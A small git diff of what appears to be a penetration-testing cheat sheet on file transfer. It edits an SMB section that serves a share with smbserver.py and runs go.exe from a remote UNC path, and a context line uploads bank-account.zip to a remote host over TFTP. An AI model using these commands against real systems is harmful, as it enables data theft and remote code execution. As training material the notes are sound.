@@ -29,10 +29,11 @@ tftp -i 10.11.0.185 PUT bank-account.zip incoming
 
 #### SMB
 ```
-smbserver.py [sharename] /tmp/smbsharedff/
+smbserver.py [sharename] [folder to server]
+smbserver.py sharez /tmp/smbsharedzz/
 
-Dir \\192.168.1.48\sharename
-\\192.168.1.48\sharename\go.exe
+Dir \\192.168.1.48\sharez
+\\192.168.1.48\sharez\go.exe
 ```
 
 
